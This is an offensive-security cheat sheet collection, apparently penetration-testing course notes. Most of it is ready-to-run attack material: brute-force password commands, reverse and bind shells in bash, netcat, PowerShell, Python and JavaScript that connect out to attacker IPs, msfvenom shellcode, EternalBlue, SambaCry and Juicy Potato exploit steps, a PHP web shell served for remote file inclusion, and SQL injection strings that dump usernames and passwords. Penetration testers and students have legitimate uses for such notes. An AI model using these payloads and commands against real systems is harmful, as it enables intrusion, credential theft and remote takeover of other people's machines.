<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/cheatsheets/03_gain-access.md#table-of-contents">Top of Page</a> |
  <a href="/cheatSheets/03_gain-access.md#bottom-of-page">Bottom of Page</a>
</p>

# Exploit
## Table of Contents
* [MS09-050: SMBv2 Command Value Vulnerability](#ms09-050-smbv2-command-value-vulnerability)
  * [CVE-2009-3103](#cve-2009-2532)
* [EternalBlue](#eternalblue)
  * [CVE-2017-0144](#cve-2017-0144)
* [SambaCry](#sambacry)
  * [CVE-2017-7494](#cve-2017-7494)
* [ShellShock](#shellshock)
  * [CVE-2014-6271](#cve-2014-6271)
* [Juicy Potato](#juicy-potato)
* [Shell via Samba Logon Command](#shell-via-samba-logon-command)

# Cheatsheet - Password Guessing
## Table of Contents
* [Online](#online)
  * [Hydra](#hydra)
  * [Crowbar](#crowbar)
* [Offline](#offline)
  * [Hashcat](#hashcat)
  * [John the Ripper](#john-the-ripper)

## Online
### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^:Error"
```

```bash
patator ftp_login host=$TARGET user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
```

### Crowbar
```bash
sudo apt install crowbar # version 0.4.1
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > ./rockyou-UTF8.txt
crowbar -b rdp -s $TARGET/32 -u administrator -C rockyou-UTF8.txt -n 1
```

## Offline
### Hashcat
```bash
hashcat -m 1000 -a 0 --force --show hashes.dump /usr/share/wordlists/rockyou.txt 
```

### John the Ripper
```bash0 
unshadow demo-passwd demo-shadow > demo-unshadow
john demo-unshadow --wordlist=/usr/share/wordlists/rockyou.txt
```

# Cheatsheets - Shells
## Table of Contents
* [Bind Shells](#bind-shells)
  * [Python](#python-bind-shell)
* [Reverse Shells](#reverse-shells)
  * [BASH](#bash-reverse-shells) 
  * [Msfvenom](#msfvenom-reverse-shells)
  * [Netcat](#netcat-reverse-shells)
  * [PowerShell](#powershell-reverse-shells)
  * [Python](#python-reverse-shells)
  * [JavaScript](#javascript-reverse-shells)
* [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
  * [Python PTY Shell](#python-pty-shell) 

## Bind Shells
#### Python Bind Shell
```python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## Reverse Shells
#### Bash Reverse Shells
```bash
bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

#### Msfvenom Reverse Shells
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rshell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell.msi
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
```

#### Netcat Reverse Shells
```bash
sudo nc -nv 10.10.10.10 443 -e /bin/bash
nc -nv 10.10.10.10 443 -e "/bin/bash"
```

#### PowerShell Reverse Shells
```bash
'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### Python Reverse Shells
```python
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

#### JavaScript Reverse Shells
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.69.123", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

## Upgrade to a PTY Shell
#### Python PTY Shell
```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
export TERM=xterm # be able to clear the screen, etc.
```

## Generating a String of Non-Repeating Characters
```bash
msf-pattern_create -l 1000 # print a string of 1000 non-repeating characters
msf-pattern_create -l 1000 -q 12345678 # get the number of bytes required to get to this offset
```

## Finding Opcodes
```bash
msf-nasm_shell # invoke msf-nasm_shell
jmp esp # give it an assembly instruction

# output
00000000 FFE4 jmp esp # the second column is the opcode that corresponds with your instruction
```

## Searching a Binary or DLL for Specific Assembly Instructions
Using Immunity Debugger
```bash
!mona find -s “\xff\xe4” -m “foo.dll” # search for “jmp esp” instruction
```

## Generating Shellcode
```bash
msfvenom -l payloads # list all payload options

# -p = payload: reverse shell
# EXITFUNC=thread = exit the thread (not process); avoids app crash
# -e = encode: to match target environment
# -b = bad characters: ASCII stuff (null, LF, CR, %, &, +, =)
# -f = (output) format: C 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread \
-e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c 

# output 
unsigned char buf[] =
"\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"

# using the above shellcode in a Python script
shell = (
    "\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
)
```

# Cheatsheet - Buffer Overflows (BOF)
## Immunity Debugger
```bash
File > Open # open a program for debugging; provide file name & arguments
Debug > Step into # follow the execution flow of a function
Debug > Step over # execute a function and return from it
```

How to find and proceed to the Main function of a program.
```bash
- [Right-click Assembly pane] > Search for > All referenced text strings
- Double-click on the correct result (and return to the Assembly pane)
- Highlight the text of interest (ex: strcpy) & press F2 (set a breakpoint)
- Debug > Run (execution will stop just before your breakpoint)
- Debug > Step into # watch program execution "frame by frame"
```

How to reset the view to the original layout (instruction, registers, memory, and stack panes). 
```bash
# option 1
View > CPU # then, maximize the CPU window

# option 2
ALT + c # then, maximize the CPU window
```

### Mona.py
Set the current working directory to be where the program (i.e. %p) being debugged is located. 
```bash
!mona config -set workingfolder c:\mona\%p
```

Toggle between command history.
```bash
# ESC + <arrow>
```

#### Controlling the EIP Register
Find all instances of a Metasploit Pattern (hence "msp"). The example below will search 2400 bytes from the ESP register (the default is to search the entire Stack Frame). The alternative to this is manually looking at the EIP register in the Registers pane (in the CPU window). Pay attention the offset value (this represents where EIP is in the BOF you sent; if you know this value, you know exactly where in your BOF you need to place the Return Address that will point to your shellcode). For example, if the example output below means you must place your desired Return Address 1978 bytes into your BOF in order for it to accuratey land in the EIP register. 
```bash
!mona findmsp -distance 2400

# example output
[+] Examining registers
    EIP contains normal pattern : 0x6f43396e (offset 1978)
```

### Generate a Byte Array of Bad Characters
This step is important for knowing what characters will prevent our shellcode from working. 
```bash
!mona bytearray -b "\x00"
```

```python
payload = ''
for x in range(1, 256):
  payload += "\\x" + "{:02x}".format(x)
```

Always re-copy the address. It will change as you remove bad characters from your BOF. 
```bash
!mona compare -f C:\mona\bytearray.bin -a <address>
```

### Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

# MS09_050: SMBv2 Command Value Vulnerability
## CVE-2009-3103
This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7. 
```bash
nmap $TARGET -p445 --script smb-vuln-cve2009-3103
wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
```

# EternalBlue
## CVE-2017-0144
This vulnerability impacts ???. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes). 
```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010
pip install impacket # mysmb.py ships with this exploit. offsec also hosts it on their GitHub
python checker.py $TARGET # check if target is vulnerable and find an accessible Named Pipe
python zzz_exploit.py $TARGET $NAMED_PIPE
```

# SambaCry
## CVE-2017-7494
Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired. 
```bash
mkdir exploits
cd exploits
git clone https://github.com/joxeankoret/CVE-2017-7494.git
cd CVE-2017-7494
mv implant.c implant.bak
vim implant.c
```

An example of a modified implant.c file. This source file gets compiled by the provided Python script. 
```c
#include <stdio.h>
#include <stdlib.h>

static void smash() __attribute__((constructor));

void smash() {
setresuid(0,0,0);
system("ping -c2 $LHOST");
}
```

My example payload sends two ICMP packets to my computer. Therefore, the command sentence below is necessary to confirm the exploit works. If you chose to include a reverse shell, you would run something like `sudo nc -nvlp 443` instead.
```bash
sudo tcpdump -i tun0 icmp 
```

Run the exploit. 
```bash
python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
```

# ShellShock
## CVE-2014-6271
```bash
# shellshock via smtp
```

## Juicy Potato
```bash
# download Juicy Potato
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# upload Juicy Potato
# ftp, smb, http, etc.

# create a reverse shell and then upload it to the target
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse-shell.exe
sudo nc -nvlp $LPORT

# use Juicy Potato to execute your reverse shell
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```

## Shell via Samba Logon Command
```bash
mkdir /mnt/$TARGET
sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
sudo cp $EXPLOIT /mnt/$TARGET
smbclient //$TARGET/$SHARE
logon "=`$EXPLOIT`"
```

```bash
cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
```

If you get the error below, change the LPORT variable of your exploit. For example, try using a port you discovered was open during the reconnaissance phase. 
```
/*
Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74

Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 89
```

To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell.

# Cheatsheets - PHP
## Table of Contents
* [Basic PHP Read-Eval-Print-Loop](#basic-php-read-eval-print-loop)
* [Serving Up a PHP Reverse Shell for an RFI](#serving-up-a-php-reverse-shell-for-an-rfi)

## Basic PHP Read-Eval-Print-Loop
```bash
vim demo.php
```
```php
<?php
  $output = shell_exec('ls -lart');
  echo "<pre>$output</pre>";
?>
```
```bash
php demo.php # <pre> tags become necessary when the code is executed by a web server and rendered by browser

# output
<pre>total 48
drwxr-xr-x   8 root    admin   256 Apr 24 20:56 ..
drwxr-xr-x+  4 Victor  staff   128 Apr 24 20:56 Public
drwx------+  3 Victor  staff    96 Apr 24 20:56 Documents
drwx------+  3 Victor  staff    96 Apr 24 20:56 Desktop
drwx------+  4 Victor  staff   128 Apr 24 20:58 Movies
drwx------+  4 Victor  staff   128 Apr 24 21:00 Pictures
drwx------+  4 Victor  staff   128 Apr 24 21:05 Music
drwx------+  5 Victor  staff   160 Apr 24 21:10 Downloads
drwx------@ 60 Victor  staff  1920 Apr 24 22:21 Library
-rw-r--r--   1 Victor  staff    74 Apr 26 15:17 demo.php
drwxr-xr-x+ 15 Victor  staff   480 Apr 26 15:17 .
</pre>
```

## Serving Up a PHP Reverse Shell for an RFI
Perform the steps below on the attacker side. 
```bash
vim reverse-shell.php
```
```php
<?php 
  echo shell_exec($_GET['cmd']); # replace this line with a reverse shell from /usr/share/webshells
?>
```
```python
sudo nc -nvlp 5050 # terminal 1
sudo python3 -m http.server 80 # terminal 2
```
```bash
# prerequisite: you must know the 'file' parameter is valid and will be referenced by
# an 'include' statement in the targeted web app's PHP code (other parameter examples: page, cmd, etc.)
firefox http://victim.edu/index.php?file=http://hacker.edu/reverse-shell.php
```

# Cheatsheets - SQL Injection
## Table of Contents
* [Oracle](#oracle)
* [MySQL](#mysql)

## Oracle
Check for a SQLi vulnerability
```bash
' 
```

Check the quality of SQLi vulnerability
```bash
' or 1=1 -- 
```

Get the number of columns of a table (increment the number until there is an error; ex: if 4 triggers an error, there are 3 columns).
```sql
' ORDER BY 1 -- 
' ORDER BY 2 -- 
' ORDER BY 3 -- 
' ORDER BY 4 -- 
```

Get all table names (look for user/admin tables).
```sql
' UNION ALL SELECT table_name,null,null FROM all_tables --
```

Get all possible column names within the entire database (look for values like "username" and "password").
```sql
' UNION ALL SELECT column_name,null,null FROM user_tab_cols --
```

Get usernames and passwords from the users table.
```sql
' UNION ALL SELECT username,password,null FROM users --
```

Get usernames and passwords from the admins table.
```sql
' UNION ALL SELECT username,password,null FROM admins --
```

Get the database software version.
```sql
' UNION ALL SELECT banner,null,null FROM v$version --
```

Get the database service account name.
```sql
' UNION ALL SELECT user,null,null FROM dual --
```

Execute a database function (ex: user(), database(), etc.).
```bash
# query goes here
```

Execute shell command (ex: find current working directory).
```bash
# query goes here
```

## Common Oracle-based SQL Query Errors
| ID | Error | Explaination |
|---|---|---|
|  ORA-00923 | FROM keyword not found where expected | Occurs when you try to execute a SELECT or REVOKE statement without a FROM keyword in its correct form and place. If you are seeing this error, the keyword FROM is spelled incorrectly, misplaced, or altogether missing. In Oracle, the keyword FROM must follow the last selected item in a SELECT statement or in the case of a REVOKE statement, the privileges. If the FROM keyword is missing or otherwise incorrect, you will see ORA-00923. |
| ORA-00933 | SQL command not properly ended | The SQL statement ends with an inappropriate clause. Correct the syntax by removing the inappropriate clauses.
| ORA-00936 | Missing expression | You left out an important chunk of what you were trying to run. This can happen fairly easily, but provided below are two examples that are the most common occurrence of this issue.The first example is the product of missing information in a SELECT statement. The second is when the FROM clause within the statement is omitted. |
| ORA-01785 | ORDER BY item must be the number of a SELECT-list expression | |
| ORA-01789 | Query block has incorrect number of result columns | |
| ORA-01790 | Expression must have same datatype as corresponding expression | Re-write the SELECT statement so that each matching column is the same data type. Try replacing the columns with null. For example, if you only want to see the table_name and the output is 3 columns, use "table_name,null,null" not "table_name,2,3". |

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit_web_apps_sqli.md">Top of Page</a> |
  <a href="/CheatSheets/2_exploit_web_apps_sqli.md#bottom-of-page">Bottom of Page</a>
</p>

## MySQL
```bash
' ORDER BY 1 #
```


## SQL Database Queries
```sql
SELECT * FROM targetdb.usertbl; # database.table
USE targetdb;
SELECT * FROM usertbl;
```

# Mind Map - Web Apps
## Enumerate 
* Enumerate the following before attempting to exploit a web app:
  * Programming language and/or web development framework in use
  * Web server software in use
  * Database software in use
  * Server operating system in use
* URLs
  * Filetype extensions (don't forget, modern web apps might use routes instead)
* Web Page Source Code
  * Comments
  * Hidden form fields
* Response Headers
  * Server header
  * "X-" headers
* Site Maps
  * robots.txt
  * sitemap.xml
* Admin Consoles
  * MySQL
    * Tomcat:
      * Path: /manager/html
    * phpMyAdmin:
      * Path: /phpmyadmin
      * Configuration file: config.inc.php

## Exploit
* Admin Consoles
  * Attempt to login using default credentials
  * Attempt to login using credentials found elsewhere (shares: SMB, NFS, etc.)
  * Use Burp Proxy to confirm which parameters are required to submit a valid HTTP request (cookie, session, password, token, etc.)
  * Use Burp Intruder to set the parameters required to submit a valid HTTP request
* XSS
  * Check if special characters are sanitized: <, >, {, }, ', ", ;
  * Check if HTML encoded special characters are sanitized  
  * Check if URL (Percent) encoded special characters are sanitized
  * Attempt a XSS attack 
    * Redirect a victim to a staged, information gathering script (HTML iframes)
    * Steal cookies and use them to negate having to authenticate to an Admin Console (JavaScript)
* Directory Traversal
  * Find references to files and change the value to something else. 
  * Look for file extensions in URLs. 
  * If you find a viable attack vector, try files accessible by all users (try the paths using encoding too; consider null characters to terminate file paths on older versions of PHP).
    * Windows:
      * C:\boot.ini
      * C:\Windows\System32\Drivers\etc\hosts
    * Linux:
      * /etc/passwd 
  * If you're able to access the web app's configuration files (ex: php.ini), you might be able to find credentials or determine if File Inclusions are allowed. 
    * Variables to check in the php.ini configuration file. 
      * register_globals: ???
      * allow_url: on 
* File Inclusions
  * Use the same techniques for identifying Directory Traversal vulnerabilities to find LFIs. 
  * For RFIs, try different ports to ensure firewalls are not a problem (ex: index.php?file=http://evil.com:443). 
  * For RFIs, try null characters to terminate file paths (necessary when dealing with older versions of PHP).
  * For RFIs, try ending your RFI paylods with ? so they're digested as part of the query string by the web server. 
  * If you can't upload files to perform an LFI, try log poisoning. You need to know the following:
    * File path for HTTP access log
        * /var/log/apache/access.log
        * /var/log/apache2/access.log
        * /var/log/httpd/access.log
    * Parameter to use (ex: file=, page=, cmd=)
  * For LFIs, try PHP protocol wrappers (file=data:text/plain,<php? echo 'foo' ?>)
* SQL Injection
  * Identify attack vectors and enumerate the underlying technology stack using single-quotes (single-quotes to delimit SQL strings)
  * Enumerate column count of immediate table using ORDER BY statements
  * Enumerate table names using UNION statements
  * Enumerate column names of interesting tables using UNION statements

## Explore
* Admin Consoles
  * Explore accessible databases
    * Determine their design (tables, columns, rows)
    * Read their contents

## Effect
* Admin Consoles
  * Add accounts to maintain access 

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/cheatsheets/03_gain-access.md#table-of-contents">Top of Page</a> |
  <a href="/cheatSheets/03_gain-access.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page 
